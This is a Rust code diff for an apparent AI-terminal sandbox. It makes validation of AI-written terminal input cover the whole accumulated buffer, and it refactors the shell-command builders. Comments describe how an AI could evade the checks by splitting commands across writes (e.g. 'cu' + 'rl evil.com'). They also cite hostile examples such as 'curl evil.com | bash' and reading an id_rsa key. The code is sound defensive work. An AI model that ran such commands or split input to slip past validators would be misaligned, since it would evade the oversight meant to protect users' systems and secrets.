@@ -103,15 +103,26 @@ impl TerminalBuffer {
 
 /// A single terminal session with PTY and buffer
 pub struct TerminalSession {
-    pub writer: Box<dyn Write + Send>,
-    pub master: Box<dyn MasterPty + Send>,
-    pub buffer: Arc<Mutex<TerminalBuffer>>,
-    pub child: Box<dyn portable_pty::Child + Send + Sync>,
-    pub title: String,
-    /// Shell type: "powershell" on Windows, "zsh" or "bash" on Unix
-    pub shell_type: String,
-    pub last_rows: u16,
-    pub last_cols: u16,
+pub writer: Box<dyn Write + Send>,
+pub master: Box<dyn MasterPty + Send>,
+pub buffer: Arc<Mutex<TerminalBuffer>>,
+pub child: Box<dyn portable_pty::Child + Send + Sync>,
+pub title: String,
+/// Shell type: "powershell" on Windows, "zsh" or "bash" on Unix
+pub shell_type: String,
+pub last_rows: u16,
+pub last_cols: u16,
+/// Accumulated AI input not yet terminated by a newline.
+///
+/// Prevents cross-write command assembly bypass: the AI could split a
+/// dangerous command across multiple `write_to_terminal` calls (e.g.
+/// "cu" + "rl evil.com\n").  Each piece individually passes validation,
+/// but the assembled command is dangerous.
+///
+/// By accumulating and validating the full buffer before each PTY write,
+/// we catch assembled commands.  The buffer is cleared on newline
+/// (command boundary) or on validation failure.
+pub pending_ai_input: String,
 }
 
 // ============================================================================
@@ -703,6 +714,7 @@ pub fn create_terminal_internal(
         shell_type: shell_type.clone(),
         last_rows: 24,
         last_cols: 80,
+        pending_ai_input: String::new(),
     };
 
     {
@@ -822,12 +834,18 @@ pub fn write_to_terminal(
     // called, which let AI bypass network, dangerous-command, and file-access
     // checks by writing directly to the PTY (e.g. `curl evil.com | bash`,
     // `type C:\Users\...\id_rsa`).
-    if source.as_deref() == Some("ai") {
+    //
+    // P3: Accumulate AI input in a per-session buffer and validate the FULL
+    // buffer, not just the current `data`.  This prevents cross-write command
+    // assembly bypass (e.g. "cu" + "rl evil.com\n").  The buffer is cleared on
+    // newline (command boundary) or validation failure.
+    let is_ai = source.as_deref() == Some("ai");
+
+    // validate_command_allowed doesn't depend on the command string — safe to
+    // call before session lookup.
+    if is_ai {
         let sandbox_ctx = sandbox::current_sandbox_context(&sandbox_state);
         sandbox_ctx.validate_command_allowed()?;
-        sandbox_ctx.validate_dangerous_command(&data)?;
-        sandbox_ctx.validate_network(&data)?;
-        sandbox_ctx.validate_command_file_access(&data)?;
     }
 
     let active = state
@@ -845,7 +863,42 @@ pub fn write_to_terminal(
         .get_mut(&resolved_id)
         .ok_or("终端不存在".to_string())?;
 
-    let data = if source.as_deref() == Some("ai") {
+    // For AI writes: accumulate in pending buffer and validate the full
+    // assembled string.  This catches commands split across multiple calls.
+    if is_ai {
+        let sandbox_ctx = sandbox::current_sandbox_context(&sandbox_state);
+
+        session.pending_ai_input.push_str(&data);
+
+        // Cap buffer to prevent unbounded growth (e.g. AI sending binary data)
+        const MAX_PENDING: usize = 64_000;
+        if session.pending_ai_input.len() > MAX_PENDING {
+            session.pending_ai_input.clear();
+        }
+
+        let full = session.pending_ai_input.clone();
+        if let Err(e) = sandbox_ctx.validate_dangerous_command(&full) {
+            session.pending_ai_input.clear();
+            return Err(e);
+        }
+        if let Err(e) = sandbox_ctx.validate_network(&full) {
+            session.pending_ai_input.clear();
+            return Err(e);
+        }
+        // PTY path always validates file access (no kernel isolation available
+        // for PTY on any platform — portable_pty lacks pre_exec hooks).
+        if let Err(e) = sandbox_ctx.validate_command_file_access(&full) {
+            session.pending_ai_input.clear();
+            return Err(e);
+        }
+
+        // Clear buffer on newline — command boundary reached.
+        if full.contains('\n') || full.contains('\r') {
+            session.pending_ai_input.clear();
+        }
+    }
+
+    let data = if is_ai {
         adapt_ai_terminal_input(&data)
     } else {
         data
@@ -1091,137 +1144,14 @@ async fn read_stream_chunks(
 /// - No marker mis-detection risk
 ///
 /// On Windows the command is run through `powershell.exe -NoProfile -Command`
-/// Build a `std::process::Command` for the given shell type.
-/// Supported values: "powershell", "pwsh", "cmd", "bash", "sh", "zsh", "fish".
-/// Falls back to platform default (powershell on Windows, bash elsewhere) if not specified.
-fn build_shell_command(shell: &Option<String>, command: &str) -> std::process::Command {
-    let shell_str = shell.as_deref().unwrap_or("").to_lowercase();
-
-    if !shell_str.is_empty() {
-        match shell_str.as_str() {
-            "cmd" => {
-                let mut c = std::process::Command::new("cmd.exe");
-                c.args(["/C", command]);
-                return c;
-            }
-            "pwsh" => {
-                let mut c = std::process::Command::new("pwsh.exe");
-                c.args(["-NoProfile", "-Command", command]);
-                return c;
-            }
-            "powershell" | "ps" => {
-                let mut c = std::process::Command::new("powershell.exe");
-                c.args(["-NoProfile", "-Command", command]);
-                return c;
-            }
-            "bash" => {
-                let mut c = std::process::Command::new("bash");
-                c.args(["-c", command]);
-                return c;
-            }
-            "sh" => {
-                let mut c = std::process::Command::new("sh");
-                c.args(["-c", command]);
-                return c;
-            }
-            "zsh" => {
-                let mut c = std::process::Command::new("zsh");
-                c.args(["-c", command]);
-                return c;
-            }
-            "fish" => {
-                let mut c = std::process::Command::new("fish");
-                c.args(["-c", command]);
-                return c;
-            }
-            // Unknown shell: try using it directly with -c flag
-            other => {
-                let mut c = std::process::Command::new(other);
-                c.args(["-c", command]);
-                return c;
-            }
-        }
-    }
-
-    // Default: platform-specific
-    if cfg!(target_os = "windows") {
-        let mut c = std::process::Command::new("powershell.exe");
-        c.args(["-NoProfile", "-Command", command]);
-        c
-    } else {
-        let mut c = std::process::Command::new("bash");
-        c.args(["-c", command]);
-        c
-    }
-}
-
-fn build_tokio_shell_command(shell: &Option<String>, command: &str) -> tokio::process::Command {
-    let shell_str = shell.as_deref().unwrap_or("").to_lowercase();
-
-    if !shell_str.is_empty() {
-        match shell_str.as_str() {
-            "cmd" => {
-                let mut c = tokio::process::Command::new("cmd.exe");
-                c.args(["/C", command]);
-                return c;
-            }
-            "pwsh" => {
-                let mut c = tokio::process::Command::new("pwsh.exe");
-                c.args(["-NoProfile", "-Command", command]);
-                return c;
-            }
-            "powershell" | "ps" => {
-                let mut c = tokio::process::Command::new("powershell.exe");
-                c.args(["-NoProfile", "-Command", command]);
-                return c;
-            }
-            "bash" => {
-                let mut c = tokio::process::Command::new("bash");
-                c.args(["-c", command]);
-                return c;
-            }
-            "sh" => {
-                let mut c = tokio::process::Command::new("sh");
-                c.args(["-c", command]);
-                return c;
-            }
-            "zsh" => {
-                let mut c = tokio::process::Command::new("zsh");
-                c.args(["-c", command]);
-                return c;
-            }
-            "fish" => {
-                let mut c = tokio::process::Command::new("fish");
-                c.args(["-c", command]);
-                return c;
-            }
-            // Unknown shell: try using it directly with -c flag
-            other => {
-                let mut c = tokio::process::Command::new(other);
-                c.args(["-c", command]);
-                return c;
-            }
-        }
-    }
-
-    // Default: platform-specific
-    if cfg!(target_os = "windows") {
-        let mut c = tokio::process::Command::new("powershell.exe");
-        c.args(["-NoProfile", "-Command", command]);
-        c
-    } else {
-        let mut c = tokio::process::Command::new("bash");
-        c.args(["-c", command]);
-        c
-    }
-}
-
 /// Resolve the shell program and argument list for executing *command*.
 ///
 /// Returns `(program, args)` suitable for `Command::new(program).args(args)`.
-/// Used by the macOS Seatbelt branch to preserve the user's shell selection
-/// instead of hardcoding `sh -c`.
-#[cfg(target_os = "macos")]
+/// This is the single source of truth for shell mapping — `build_shell_command`,
+/// `build_tokio_shell_command`, and the macOS Seatbelt branch all call this.
+///
+/// Supported values: "powershell", "pwsh", "cmd", "bash", "sh", "zsh", "fish".
+/// Falls back to platform default (powershell on Windows, bash elsewhere) if not specified.
 fn shell_program_and_args(shell: &Option<String>, command: &str) -> (String, Vec<String>) {
     let shell_str = shell.as_deref().unwrap_or("").to_lowercase();
     let (program, prefix_args): (&str, &[&str]) = if !shell_str.is_empty() {
@@ -1235,12 +1165,30 @@ fn shell_program_and_args(shell: &Option<String>, command: &str) -> (String, Vec
             "fish" => ("fish", &["-c"][..]),
             other => (other, &["-c"][..]),
         }
+    } else if cfg!(target_os = "windows") {
+        ("powershell", &["-NoProfile", "-Command"][..])
     } else {
         ("bash", &["-c"][..])
     };
     let mut args: Vec<String> = prefix_args.iter().map(|s| s.to_string()).collect();
     args.push(command.to_string());
     (program.to_string(), args)
+}
+
+/// Build a `std::process::Command` for the given shell type.
+fn build_shell_command(shell: &Option<String>, command: &str) -> std::process::Command {
+    let (program, args) = shell_program_and_args(shell, command);
+    let mut c = std::process::Command::new(&program);
+    c.args(&args);
+    c
+}
+
+/// Build a `tokio::process::Command` for the given shell type.
+fn build_tokio_shell_command(shell: &Option<String>, command: &str) -> tokio::process::Command {
+    let (program, args) = shell_program_and_args(shell, command);
+    let mut c = tokio::process::Command::new(&program);
+    c.args(&args);
+    c
 }
 
 /// so that `&&`, `||`, pipes, and other shell features work correctly.
@@ -1264,7 +1212,16 @@ pub async fn execute_command(
     sandbox_ctx.validate_command_allowed()?;
     sandbox_ctx.validate_dangerous_command(&command)?;
     sandbox_ctx.validate_network(&command)?;
-    sandbox_ctx.validate_command_file_access(&command)?;
+    // On Linux/macOS, kernel-level FS isolation (Landlock/Seatbelt) is applied
+    // below in this code path, making the application-layer file-access
+    // heuristic redundant and coarser. Skip it to avoid double-strictness.
+    // Windows has no kernel FS isolation — keep the check.
+    //
+    // NOTE: The PTY terminal path (write_to_terminal) always keeps this check
+    // because portable_pty doesn't support pre_exec hooks for Landlock/Seatbelt.
+    if cfg!(not(any(target_os = "linux", target_os = "macos"))) {
+        sandbox_ctx.validate_command_file_access(&command)?;
+    }
     if let Some(ref dir) = working_dir {
         sandbox_ctx.validate_command_cwd(Some(std::path::Path::new(dir)))?;
     }
@@ -1633,7 +1590,13 @@ pub fn execute_command_bg(
     sandbox_ctx.validate_command_allowed()?;
     sandbox_ctx.validate_dangerous_command(&command)?;
     sandbox_ctx.validate_network(&command)?;
-    sandbox_ctx.validate_command_file_access(&command)?;
+    // On Linux/macOS, kernel-level FS isolation (Landlock/Seatbelt) is applied
+    // below in this code path, making the application-layer file-access
+    // heuristic redundant and coarser. Skip it to avoid double-strictness.
+    // Windows has no kernel FS isolation — keep the check.
+    if cfg!(not(any(target_os = "linux", target_os = "macos"))) {
+        sandbox_ctx.validate_command_file_access(&command)?;
+    }
     if let Some(ref dir) = working_dir {
         sandbox_ctx.validate_command_cwd(Some(std::path::Path::new(dir)))?;
     }
